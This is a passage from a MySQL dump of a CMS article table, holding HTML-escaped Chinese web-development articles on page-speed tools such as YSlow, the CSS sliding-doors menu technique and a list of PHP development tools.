扩展&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;YSlow Firebug 扩展使主观的网页分析日渐被淘汰。YSlow 使用 Yahoo! 起草的面向高性能网站的权威规则，分析网页并告诉您它们变慢的原因。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;161&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;162&quot;&gt;&lt;a name=&quot;analyzepgs&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;使用 YSlow 分析网页&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;163&quot;&gt;YSlow 是一个相对较小但非常有用的 Firefox 扩展。当启动 YSlow 时，该扩展在浏览器的下半部分中打开，如 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#fig4&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;图 4&lt;/font&gt;&lt;/a&gt; 所示。&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;fig4&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;图 4. Firefox 中的 YSlow 扩展&amp;nbsp;&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;图 4 显示了 Performance 视图，可以在其中看到 YSlow 如何评估您的网页的性能，还能够看到该扩展检测到的问题。单击列表中的一个链接将打开一个页面，其中解释了相应的错误。如果存在可以改进的页面组件，YSlow 会给出改进建议。&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;165&quot;&gt;在 Inspect 视图中，如 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#fig5&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;图 5&lt;/font&gt;&lt;/a&gt; 所示，您可以逐一分析元素来剖析页面。Inspect 视图的一个最有用的功能是，当您在页面上移动鼠标指针时，它会自动刷新，因此您无需通过滚动代码内容来查找需要检查的行。 &lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;fig5&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;图 5. Firefox 中的 YSlow Inspect 视图&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;167&quot;&gt;从 Stats 视图的名称可以猜测到，它（如 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#fig6&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;图 6&lt;/font&gt;&lt;/a&gt; 所示）显示与当前页面有关的统计数据。这些数据包括空的和主要的缓存和 cookie。&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;fig6&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;图 6. Firefox 中的 YSlow Stats 视图&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;169&quot;&gt;Components 视图（如 &lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#fig7&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;图 7&lt;/font&gt;&lt;/a&gt; 所示）列出了当前页面上的组件。显示的与每个组件有关的数据包括文件类型和路径、页面过期时间以及 HTTP 响应报头。单击一个组件可以将其打开，以供查看。单击一个列标题可以按升序或降序对表进行排序。&lt;/p&gt;\r\n&lt;p&gt;&lt;br /&gt;\r\n&lt;a name=&quot;fig7&quot;&gt;&lt;b&gt;&lt;font face=&quot;Arial&quot; size=&quot;2&quot;&gt;图 7. YSlow Components 视图&lt;/font&gt;&lt;/b&gt;&lt;/a&gt;&lt;br /&gt;\r\n&amp;nbsp;&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p&gt;YSlow 是一个较小的、有用的扩展，可以在提高页面加载速度方面为您提供许多帮助。如果您以前未使用过它，那么现在应该使用了。&lt;/p&gt;\r\n&lt;div class=&quot;ibm-alternate-rule&quot;&gt;&lt;hr /&gt;\r\n&lt;/div&gt;\r\n&lt;p class=&quot;ibm-ind-link ibm-back-to-top&quot; sizcache=&quot;20&quot; sizset=&quot;171&quot;&gt;&lt;a class=&quot;ibm-anchor-up-link&quot; href=&quot;http://www.ibm.com/developerworks/cn/web/wa-speedweb/?S_TACT=105AGX52&amp;amp;S_CMP=tec-csdn#ibm-pcon&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;&lt;strong&gt;回页首&lt;/strong&gt;&lt;/font&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;172&quot;&gt;&lt;a name=&quot;summary&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;结束语&lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;优化网页的加载速度并不复杂。实际上，您通常可以轻而易举地实现速度优化。如果遵循本文中介绍的技巧以及 Web 开发最佳实践，那么无需采用其他措施就可以提高页面的加载速度。&lt;/p&gt;\r\n&lt;p&gt;将大量页面优化技巧收集到一起很简单，我希望本文的资源具有一定的价值。但是，如果您认为速度优化技巧只有这里列出的这些，那么您将惊奇地发现远远不止这些。但是，即使您仅遵循这 20 多个技巧，您的页面的加载速度也会更快，您的用户也会更惬意 —— 无论他们通过拨号还是专用的宽带上网。&lt;/p&gt;\r\n&lt;p&gt;&lt;!-- CMA ID: 380787 --&gt;&lt;!-- Site ID: 10 --&gt;&lt;!-- XSLT stylesheet used to transform this file:  dw-article-6.0-beta.xsl --&gt;&lt;br /&gt;\r\n&lt;/p&gt;\r\n&lt;p sizcache=&quot;20&quot; sizset=&quot;173&quot;&gt;&lt;a name=&quot;resources&quot;&gt;&lt;span class=&quot;atitle&quot;&gt;&lt;strong&gt;&lt;font size=&quot;5&quot;&gt;参考资料 &lt;/font&gt;&lt;/strong&gt;&lt;/span&gt;&lt;/a&gt;&lt;/p&gt;\r\n&lt;p&gt;&lt;strong&gt;学习&lt;/strong&gt;&lt;/p&gt;\r\n&lt;ul sizcache=&quot;20&quot; sizset=&quot;174&quot;&gt;&lt;li sizcache=&quot;20&quot; sizset=&quot;174&quot;&gt;在 Wikipedia 上查找 &lt;a href=&quot;http://en.wikipedia.org/wiki/Broadband_Internet_access&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;与宽带网络接入相关的一般信息和指标&lt;/font&gt;&lt;/a&gt;。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;175&quot;&gt;阅读 Yahoo! Exceptional Performance 团队起草的 &lt;a href=&quot;http://developer.yahoo.com/performance/index.html#rules&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;高性能网站规则&lt;/font&gt;&lt;/a&gt;。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;176&quot;&gt;阅读 Martin Brown 的文章 “&lt;a href=&quot;http://www.serverwatch.com/tutorials/article.php/3514866&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;Using HTTP Compression&lt;/font&gt;&lt;/a&gt;”（ServerWatch，2005 年 6 月），了解有关 HTTP 压缩各方面的详细信息。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;177&quot;&gt;了解 &lt;a href=&quot;http://www.alistapart.com/articles/sprites/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;CSS sprites&lt;/font&gt;&lt;/a&gt; —— 它们是什么以及如何使用它们加快图像加载速度。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;178&quot;&gt;Learn how to &lt;a href=&quot;http://javascript-reference.info/speed-up-your-javascript-load-time.htm&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;加快 JavaScript 加载速度&lt;/font&gt;&lt;/a&gt;。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;179&quot;&gt;阅读 Jesse Skinner 的 developerWorks 文章 “&lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/wa-aj-when&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;在应用程序中使用 Ajax 的时机&lt;/font&gt;&lt;/a&gt;”。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;180&quot;&gt;了解与 &lt;a href=&quot;http://www.gnu.org/software/gzip/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;gzip 压缩库&lt;/font&gt;&lt;/a&gt; 有关的更多信息。 &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;181&quot;&gt;&lt;a href=&quot;http://www.ibm.com/developerworks/cn/web/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;developerWorks Web 开发专区&lt;/font&gt;&lt;/a&gt; 包含用于 Web 2.0 开发的大量工具和信息。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;182&quot;&gt;&lt;a href=&quot;http://www.ibm.com/developerworks/cn/offers/techbriefings/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;developerWorks 技术活动和网络广播&lt;/font&gt;&lt;/a&gt;：随时关注最新技术。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;183&quot;&gt;&lt;a href=&quot;http://www.ibm.com/developerworks/apps/SendTo?bookstore=safari&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;技术书店&lt;/font&gt;&lt;/a&gt;：浏览与本文所述主题和其他技术主题相关的图书。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;&lt;b&gt;获得产品和技术&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul sizcache=&quot;20&quot; sizset=&quot;184&quot;&gt;&lt;li sizcache=&quot;20&quot; sizset=&quot;184&quot;&gt;使用 &lt;a href=&quot;http://www.crockford.com/javascript/jsmin.html&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;JSMin&lt;/font&gt;&lt;/a&gt; 将您的 JavaScript 文件精简到极限。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;185&quot;&gt;&lt;a href=&quot;http://developer.yahoo.com/yui/compressor/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;YUI Compressor&lt;/font&gt;&lt;/a&gt; 是 Yahoo! 的 JavaScript 压缩器和 Yahoo! UI Library 的一部分。这个站点还提供了有关压缩代码的不同方面以及理想的代码如何淡化负面效应的大量读物。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;186&quot;&gt;&lt;a href=&quot;http://www.jslint.com/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;JSLint&lt;/font&gt;&lt;/a&gt; 可以帮助您识别糟糕的编码实践。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;187&quot;&gt;&lt;a href=&quot;http://getfirebug.com/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;Firebug&lt;/font&gt;&lt;/a&gt; 是一个 Firefox 插件，为您提供了广泛的开发工具。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;188&quot;&gt;发现和下载 &lt;a href=&quot;http://gears.google.com/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;Google Gears&lt;/font&gt;&lt;/a&gt;。&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;li sizcache=&quot;20&quot; sizset=&quot;189&quot;&gt;&lt;a href=&quot;http://developer.yahoo.com/yslow/&quot;&gt;&lt;font color=&quot;#4c6e94&quot;&gt;YSlow&lt;/font&gt;&lt;/a&gt; 是 Yahoo! 开发的一个 Fireb', 1, 1, 0, 0, 1301799920, 1, 'admin');
INSERT INTO `cp_article` (`id`, `cat_id`, `title`, `keywords`, `description`, `content`, `views`, `status`, `top`, `recommend`, `create_time`, `create_uid`, `create_username`) VALUES
(19, 1, 'css滑动门技术的介绍及实例分享', '', '', '&quot;如果你是一个css&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E9%AB%98%E6%89%8B&quot;&gt;高手&lt;/span&gt;的话,那你就来详细介绍一下css滑动门&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%8A%80%E6%9C%AF&quot;&gt;技术&lt;/span&gt;&quot;.看了这句话不得不&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%AD%A6%E4%B9%A0&quot;&gt;学习&lt;/span&gt;一下这个所谓的css滑动门技术.我也想当高手啊.当时在&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%99%BE%E5%BA%A6&quot;&gt;百度&lt;/span&gt;知道里回答问题的时候发现有很多有问相关css滑动门技术的文章。当时真是不知道css里还有个滑动门技术. 所谓的滑动门，可以这样理解，菜单的 背景图(圆角，直角，其它等)会根据文字的多少而自动变长(变短)，这好象一个可滑动的门一样. &lt;br /&gt;\r\ncss滑动门技术的背景: &lt;br /&gt;\r\n　　可以这样说css滑动门技术是被刺激出来的,因为很多人认为css并不能做出漂亮的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%BD%91%E9%A1%B5&quot;&gt;网页&lt;/span&gt;,但是事实上恰恰相反,css不仅能做出相当漂亮的网页,还可以很好得把内容和表现分开,给&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%AE%BE%E8%AE%A1&quot;&gt;设计&lt;/span&gt;师和&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%BC%80%E5%8F%91&quot;&gt;开发&lt;/span&gt;人员更大的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%A9%BA%E9%97%B4&quot;&gt;空间&lt;/span&gt;去发挥; &lt;br /&gt;\r\ncss滑动门技术的定义 &lt;br /&gt;\r\n　　滑动门技术就是:当点击&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E9%A1%B5%E9%9D%A2&quot;&gt;页面&lt;/span&gt;上的导航按钮后这个导航按钮的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=CSS&quot;&gt;CSS&lt;/span&gt;特性发生变化，从而区别于该组的其他导航按钮，提示给操作者，当前浏览的内容就是这个CSS特性发生变化的按钮所指向的内容。这种&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%95%88%E6%9E%9C&quot;&gt;效果&lt;/span&gt;的一大好处在于，在多导航的页面上能够清晰地反映当前浏览内容隶属于哪个栏目或者哪个类，同时给人以美观、清晰、明了的视觉感受。滑动门技术的主角是被操作的对象，也就是这里被点击的对象，其CSS特性主要是指该导航按钮包括其中的其它元素的属性发生变化，当然，这个按钮的形式可以是BUTTON、A、TD甚至可以是P或者&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=DIV&quot;&gt;DIV&lt;/span&gt;这样的闭合元素，它们的属性主要是指这个元素的边框、背景、字体的颜色、大小、粗细以及外间距和内间距等等，总之，其一切可以把自身的“地位”区别于其它属主的属性都可以被&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%BA%94%E7%94%A8&quot;&gt;应用&lt;/span&gt;起来使用在滑动门技术上。 &lt;br /&gt;\r\ncss滑动门技术的应用范围: &lt;br /&gt;\r\n网站导航菜单 &lt;br /&gt;\r\n总结几个技术要点: &lt;br /&gt;\r\nA:由于我们只用css来实现，且&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E4%BB%A3%E7%A0%81&quot;&gt;代码&lt;/span&gt;要尽可能的少，那么ul和li标签就是我们的首先了， &lt;br /&gt;\r\nB:ui有默认的标属性，我们要用margin:0px;padding:0px;list-style:none;来通用它 &lt;br /&gt;\r\nC:li默认是竖着排列的，我们要用display:inline;来让它在单行中显示 &lt;br /&gt;\r\nD:a默认是 行内元素，我们要&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%AE%BE%E7%BD%AE&quot;&gt;设置&lt;/span&gt;它float:left来让它靠左边 &lt;br /&gt;\r\nE:span默认也是 行内元素，我们常用它来调菜单的高度，所以要设置display:block; &lt;br /&gt;\r\nF:由于span在a标签内，如果span高度被拉高了，那么a中的背景图也会自动拉高 &lt;br /&gt;\r\nG:由于span背景图在a背景图内，如果不设置a标签的padding-left:4px(它恰好为左背景图的宽);左边(a标签的)的背景图会被右边(span标签内的)的背景图完全覆盖 &lt;br /&gt;\r\nH:图片的定位是由 &lt;br /&gt;\r\nbackground:url(tableft.gif) left top no-repeat;和 &lt;br /&gt;\r\nbackground:url(tableft.gif) left -42px no-repeat; &lt;br /&gt;\r\n来实现的，一定要设置no-repeat,-42为图片总高的一半 &lt;br /&gt;\r\n&lt;br /&gt;\r\n请看如下&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%AE%9E%E4%BE%8B&quot;&gt;实例&lt;/span&gt;代码： &lt;br /&gt;\r\nhtml代码: &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nHome &lt;br /&gt;\r\n&lt;br /&gt;\r\nNews &lt;br /&gt;\r\n&lt;br /&gt;\r\nDownloads &lt;br /&gt;\r\n&lt;br /&gt;\r\nServices &lt;br /&gt;\r\n&lt;br /&gt;\r\nSupport &lt;br /&gt;\r\n&lt;br /&gt;\r\nAbout &lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\n&lt;br /&gt;\r\nCSS样式代码如下: &lt;br /&gt;\r\na{ text-decoration:none; color:#FFFFFF;} &lt;br /&gt;\r\n#menu ul{ margin:0px; padding:0px; list-style:none;} &lt;br /&gt;\r\n#menu li{ display:inline;} &lt;br /&gt;\r\n#menu a{ float:left; background:url(tableft.gif) left top no-repeat; padding-left:4px;} &lt;br /&gt;\r\n#menu span{ display:block; background:url(tabright.gif) right top no-repeat; padding:4px 10px 4px 6px;} &lt;br /&gt;\r\n#menu a:hover{ background:url(tableft.gif) left -42px no-repeat;} &lt;br /&gt;\r\n#menu a:hover span{ background:url(tabright.gif) right -42px no-repeat;}', 1, 1, 0, 0, 1301800778, 1, 'admin'),
(20, 1, '50款优秀而又实用的PHP工具', '', '', '国外著名网站smashingmagazine给大家带来了50款优秀而又实用的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=PHP&quot;&gt;PHP&lt;/span&gt;&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%B7%A5%E5%85%B7&quot;&gt;工具&lt;/span&gt;，其中包括PHP&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E4%BB%A3%E7%A0%81&quot;&gt;代码&lt;/span&gt;测试、优化工具，图像处理工具，以及&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%BC%80%E5%8F%91&quot;&gt;开发&lt;/span&gt;过程必须的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%BD%AF%E4%BB%B6&quot;&gt;软件&lt;/span&gt;配置&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%AE%A1%E7%90%86&quot;&gt;管理&lt;/span&gt;工具等，相信这些工具能够让使用PHP的朋友如虎添翼！&lt;br /&gt;\r\n50款优秀而又实用的PHP工具：&lt;br /&gt;\r\n一、PHP代码调试工具 &lt;br /&gt;\r\n&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=Web&quot;&gt;Web&lt;/span&gt;grind &lt;br /&gt;\r\nWebgrind完美支持PHP 5，安装迅速简便，可以跨越多个&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%B9%B3%E5%8F%B0&quot;&gt;平台&lt;/span&gt;运行。 &lt;br /&gt;\r\nXdebug &lt;br /&gt;\r\nXdebug是使用极为广泛的PHP代码调试工具，它提供大量的工具帮助你找出&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E7%A8%8B%E5%BA%8F&quot;&gt;程序&lt;/span&gt;中潜在的BUG，并且它得到了很多PHP开发工具的支持，以做为专门的测试工具继承在这些开发工具中，比如PHPEclipse、phpDesigner等。 &lt;br /&gt;\r\nGubed PHP Debugger &lt;br /&gt;\r\nDBG &lt;br /&gt;\r\nPHP_Debug &lt;br /&gt;\r\nPHP_Debug是一款开源的PHP代码调试工具，它能够从多方面给出有用的信息从而帮助你排除代码中存在的问题，并且集成性能测试工具，比如PHP代码执行时间以及SQL&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E8%AF%AD%E5%8F%A5&quot;&gt;语句&lt;/span&gt;执行时间等信息。 &lt;br /&gt;\r\nPHP_Dyn &lt;br /&gt;\r\nMacGDBp &lt;br /&gt;\r\n二、PHP代码测试、优化工具 &lt;br /&gt;\r\nPHPUnit ：一款基于PHP 5的JUnit组件测试工具。 &lt;br /&gt;\r\nSimpleTest &lt;br /&gt;\r\nSimpleTest是一款高度集成的PHP代码测试工具。 &lt;br /&gt;\r\nSelenium ：一款&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E4%B8%93%E4%B8%9A&quot;&gt;专业&lt;/span&gt;全自动WEB站点PHP代码测试工具，比较侧重的UI输入输出&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%95%B0%E6%8D%AE&quot;&gt;数据&lt;/span&gt;测试。 &lt;br /&gt;\r\nPHP_CodeSniffer &lt;br /&gt;\r\ndBug &lt;br /&gt;\r\n一款专注于测试类、对象、数组以及XML&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E6%96%87%E4%BB%B6&quot;&gt;文件&lt;/span&gt;的PHP工具。 &lt;br /&gt;\r\nPHP Profile Class &lt;br /&gt;\r\n三、文档管理工具 &lt;br /&gt;\r\nphpDocumentor ：一款著名的PHP代码管理工具，支持PHP源代码到&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=HTML&quot;&gt;HTML&lt;/span&gt;、PDF、CHM等格式的文档输出。 &lt;br /&gt;\r\nPHP DOX &lt;br /&gt;\r\n四、安全类工具 &lt;br /&gt;\r\nSecurimage ：好用的图像格式&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E9%AA%8C%E8%AF%81&quot;&gt;验证&lt;/span&gt;码工具。 &lt;br /&gt;\r\nScavenger ：一款实时攻击检测工具。 &lt;br /&gt;\r\nPHP-IDS ：一款非法潜入检测工具。 &lt;br /&gt;\r\nPixy ：一款危险代码检查工具，检测来自编程人员自身或者外部信息提交可能的破坏性代码。 &lt;br /&gt;\r\n五、图形图像处理工具 &lt;br /&gt;\r\nPHP/SWF Charts &lt;br /&gt;\r\npChart - a chart-drawing PHP library &lt;br /&gt;\r\nWideImage &lt;br /&gt;\r\nMagickWand For PHP &lt;br /&gt;\r\n六、PHP代码格式处理工具&lt;br /&gt;\r\n这些工具可以帮助你按照需求对源代码进行相应的格式处理，比如代码缩进以及分段等，是代码看上去结构分明，易于复用及管理。 &lt;br /&gt;\r\nPHP_Beautifier &lt;br /&gt;\r\nPHPCodeBeautifier &lt;br /&gt;\r\nGeSHi - Generic Syntax Highlighter &lt;br /&gt;\r\n七、配置管理工具（版本控制）&lt;br /&gt;\r\n软件配置管理中有一个比较重要的环节－代码版本库的维护，这样有利于同版本的交叉开发、维护以及后期版本回溯，这对于大型&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E9%A1%B9%E7%9B%AE&quot;&gt;项目&lt;/span&gt;尤为重要，以下两款工具可以很好的帮助你。 &lt;br /&gt;\r\nPhing &lt;br /&gt;\r\nxinc &lt;br /&gt;\r\n八、PHP扩展、工具集、类库支持 &lt;br /&gt;\r\nSimplePie &lt;br /&gt;\r\n此工具可用于PHP RSS解析。 &lt;br /&gt;\r\nHTML Purifier ：此工具可以用来移除所有恶意代码(XSS)，而且还能确保你的&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E9%A1%B5%E9%9D%A2&quot;&gt;页面&lt;/span&gt;遵循W3C的标准规范。 &lt;br /&gt;\r\nTCPDF ：一个可以用于快速生成PDF文件的PHP5&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%87%BD%E6%95%B0&quot;&gt;函数&lt;/span&gt;包。 &lt;br /&gt;\r\nhtmlSQL ：一组可以使你方便的对HTML和XML内容方便的使用类似SQL语句进行检索的PHP类集。 &lt;br /&gt;\r\nThe Greatest PHP Snippet File Ever (Using Quicktext for Notepad++) &lt;br /&gt;\r\nCreole ：本工具使用PHP 5编写， 是一款真正意义的OO的层，包含丰富的以JDBC为&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; href=&quot;http://www.canphp.com/admin/index.php/article/tag.php?name=%E5%9F%BA%E7%A1%80&quot;&gt;基础&lt;/span&gt;的API接口。 &lt;br /&gt;\r\nPHPLinq ：帮助你方便的使用SQL语法对PHP数组进行操作，避免不正当的数组初始化以及溢出 &lt;br /&gt;\r\nPHPMathPublisher &lt;br /&gt;\r\n&lt;br /&gt;\r\n本工具可以帮助你方便的使用脚本语言创建类似上图的复杂数学表达式。 &lt;br /&gt;\r\nphpMyAdmin ：大家很熟悉的一款SQL管理工具，提供完善的GUI&lt;span class=&quot;t_tag&quot; onclick=&quot;tagshow(event)&quot; 